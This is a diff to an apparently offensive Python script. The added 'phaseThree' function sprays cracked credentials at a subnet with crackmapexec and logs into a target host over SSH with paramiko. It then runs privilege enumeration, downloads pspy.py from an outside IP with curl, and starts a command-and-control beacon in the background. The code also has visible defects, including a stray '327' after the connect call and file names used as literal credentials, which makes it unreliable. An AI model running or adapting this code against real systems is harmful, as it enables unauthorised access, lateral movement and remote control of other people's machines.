@@ -117,7 +117,7 @@ def phaseTwo():
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 		# Connect to the SSH server
-		client.connect(target_ip, username=username, password=password)
+		client.connect(target_ip, username=username, password=password)327
 
 		for command in commands:
 			# Execute each command with the password
@@ -136,12 +136,52 @@ def phaseTwo():
 		pass
 	print("finished phase two tasks.")
 	
-	
+def phaseThree():
+	subnet = "208.11.22.0/24"
+	target_ip = "208.11.22.204"
+	username = "cracked_users.txt"
+	password = "cracked_passwords.txt"
+	# Run fping against the subnet
+	print(f"Running fping against the subnet {subnet}")
+	#subprocess.run(["fping", "-g", subnet, "-a"])
+	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
+	#subprocess.run(cme, shell=True, text=True)
+	commands = [
+	"whoami",
+	f"echo {password} | sudo -S -l",
+	"pwd",
+	"curl http://94.249.192.5:8000/pspy.py -o /tmp/pspy.py"
+	]
+	client = paramiko.SSHClient()
+	try:
+		# Automatically add the server's host key
+		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+		# Connect to the SSH server
+		client.connect(target_ip, username=username, password=password)327
+
+		for command in commands:
+			# Execute each command with the password
+			full_command = f"{command}"
+			stdin, stdout, stderr = client.exec_command(full_command)
+
+			# Print the output
+			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+		# Finish command loop and then run C2 Beacon in the background
+		full_command = f"echo {password} | {awkC2}"
+		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
+		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+		# Close the SSH connection
+		client.close()
+	except Exception as e:
+		pass
+
 def main():
 	# Ensure Sudo Usage
 	check_root()
 	# Run phaseOne function
 	phaseTwo()
+	phaseThree()
 
 if __name__ == "__main__":
 	main()
